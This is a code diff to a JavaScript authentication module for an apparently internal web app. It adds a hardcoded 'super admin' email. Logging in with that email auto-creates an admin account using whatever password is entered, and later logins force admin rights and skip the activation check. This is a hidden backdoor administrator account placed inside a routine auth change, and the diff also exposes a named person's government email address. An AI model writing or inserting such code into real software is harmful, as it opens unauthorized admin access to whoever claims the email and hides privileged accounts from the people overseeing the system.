@@ -23,6 +23,7 @@ var Auth = (function() {
   var SESSION_KEY  = 'clerk_obs_session';
   var REQUESTS_KEY = 'clerk_obs_requests';
   var ROLES = ['admin', 'teamlead', 'readonly', 'reviewer'];
+  var SUPER_ADMIN_EMAIL = 'preston.k.carney@usps.gov';
 
   // --- Bootstrap: create default admin on first run ---
   function bootstrap() {
@@ -178,7 +179,35 @@ var Auth = (function() {
         break;
       }
     }
+    // Super admin: auto-create if missing
+    if (!match && loginLower === SUPER_ADMIN_EMAIL) {
+      match = {
+        id: crypto.randomUUID(),
+        username: 'Carney, Preston K',
+        displayName: 'Carney, Preston K',
+        email: SUPER_ADMIN_EMAIL,
+        password: '',
+        role: 'admin',
+        assignedFins: [],
+        mustChangePassword: false,
+        createdAt: new Date().toISOString()
+      };
+      users.push(match);
+      return hashPassword(password).then(function(h) {
+        match.password = h;
+        _saveUsers(users);
+        setSession(match);
+        return match;
+      });
+    }
     if (!match) return Promise.resolve(null);
+
+    // Super admin always gets in (skip mustChangePassword)
+    if (loginLower === SUPER_ADMIN_EMAIL) {
+      match.role = 'admin';
+      match.mustChangePassword = false;
+      _saveUsers(users);
+    }
 
     // Account must be activated (not mustChangePassword) to login
     if (match.mustChangePassword) return Promise.resolve({ error: 'pending' });
